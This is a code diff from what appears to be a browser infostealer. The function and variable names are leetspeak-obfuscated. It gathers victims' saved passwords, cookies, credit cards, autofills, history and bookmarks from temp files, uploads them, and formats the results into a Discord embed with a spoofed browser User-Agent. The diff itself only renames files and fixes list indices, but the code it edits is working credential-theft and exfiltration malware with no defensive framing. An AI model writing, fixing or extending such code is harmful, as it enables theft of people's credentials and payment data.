@@ -798,8 +798,8 @@ def G378r0W53r5(br0W53rP47H5):
     for thread in Browserthread: thread.join()
 
     for file in [
-        "cspasswords.txt", "cscookies.txt", "cscreditcards.txt", "csautofills.txt",
-        "csautofill.txt", "cshistory.txt", "cshistories.txt", "csbookmarks.txt"
+        "cspasswords.txt", "cscookies.txt", "cscreditcards.txt", "csautofill.txt",
+        "csautofills.txt", "cshistory.txt", "cshistories.txt", "csbookmarks.txt"
     ]:
         filess.append(UP104D7060F113(os.getenv("TEMP") + "\\" + file))
     headers = {"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
@@ -823,7 +823,7 @@ def G378r0W53r5(br0W53rP47H5):
             },
             {
                 "title": f"{cname} | Browser Data",
-                "description": f"<:srcr_newspaper:1187579795056373782> • **{H1570rYC0UNt}** Histories Found\n<:blackarrow:1095740975197995041> • [{cname}Histories.txt]({filess[4]})\n\n<:lol_role_fill:1187747599286018149> • **{AU70F111C0UNt}** Autofills Found\n<:blackarrow:1095740975197995041> • [{cname}Autofills.txt]({filess[3]})\n\n<:1SW_CreditCard:1187580159495245876> • **{CC5C0UNt}** Credit Cards Found\n<:blackarrow:1095740975197995041> • [{cname}CreditCards.txt]({filess[2]})\n\n<:black_book:1187577552739508286> • **{B00KM4rK5C0UNt}** Bookmarks Found\n<:blackarrow:1095740975197995041> • [{cname}Bookmarks.txt]({filess[5]})",
+                "description": f"<:srcr_newspaper:1187579795056373782> • **{H1570rYC0UNt}** Histories Found\n<:blackarrow:1095740975197995041> • [{cname}History.txt]({filess[5]})\n\n<:lol_role_fill:1187747599286018149> • [{cname}Histories.txt]({filess[6]})\n\n<:lol_role_fill:1187747599286018149> • **{AU70F111C0UNt}** Autofills Found\n<:blackarrow:1095740975197995041> • [{cname}Autofill.txt]({filess[3]})\n\n<:1SW_CreditCard:1187580159495245876> • [{cname}Autofills.txt]({filess[4]})\n\n<:1SW_CreditCard:1187580159495245876> • **{CC5C0UNt}** Credit Cards Found\n<:blackarrow:1095740975197995041> • [{cname}CreditCards.txt]({filess[2]})\n\n<:black_book:1187577552739508286> • **{B00KM4rK5C0UNt}** Bookmarks Found\n<:blackarrow:1095740975197995041> • [{cname}Bookmarks.txt]({filess[7]})",
                 "color": 2895667,
                 "footer": {"text": f"{footerc}",  
                 "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
